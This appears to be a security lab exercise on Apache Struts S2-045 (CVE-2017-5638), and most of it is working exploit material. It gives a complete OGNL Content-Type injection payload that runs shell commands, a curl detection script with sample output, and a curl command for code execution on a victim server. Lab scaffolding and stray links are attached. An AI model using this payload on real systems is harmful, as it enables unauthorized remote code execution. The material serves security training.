
To finish this exercise, you need to run the binary (/usr/local/bin/score) with your UUID (03031824-841d-47c6-9cec-5144b3087f28) as first argument:

/usr/local/bin/score 03031824-841d-47c6-9cec-5144b3087f28

You can access this exercise using the following URL: http://ptl-8c1ff287-f36d3391.libcurl.so/. 

The payload

A lot of exploits are already available, most of them are just wrappers around the following payload:

``` sh
%{(#n='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}

```

Detection

We can easily tweak this payload to allow us to detect the vulnerability without trying to run command.

``` sh

%{(#n='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getWriter())).(#ros.print('\ntest\n\n'))}

$ cat detect.sh 

``` sh
curl --header "Content-Type: %{(#n='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getWriter())).(#ros.print('\ntest\n\n'))}" $1 

```

$ sh detect.sh [SERVER]

test

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<html>
<head>
    <META HTTP-EQUIV="Refresh" CONTENT="0;URL=example/HelloWorld.action">
</head>

<body>
<p>Loading ...</p>
</body>
</html>

```

Gaining code execution
Gaining code execution with this payload is as simple as running a curl command with the right argument:

``` sh
$ curl --header "Content-Type: [PAYLOAD]" http://[SERVER]/
```

Where:

[PAYLOAD] is your payload.
[SERVER] is the victim.

Conclusion
This exercise explained how to gain code execution when a Struts application is vulnerable to s2-045. When you are coming across a Struts application, it's essential that you test for this issue.



https://www.google.nl/search?q=download+file+from+vps+to+pc&rlz=1C1CHFX_enNL754NL754&oq=download+file+from+vps&aqs=chrome.1.69i57j0l5.6699j0j4&sourceid=chrome&ie=UTF-8

https://securityonline.info/exploiting-apache-struts-s2-045-cve-2017-5638-vulnerability-with-metasploit/ 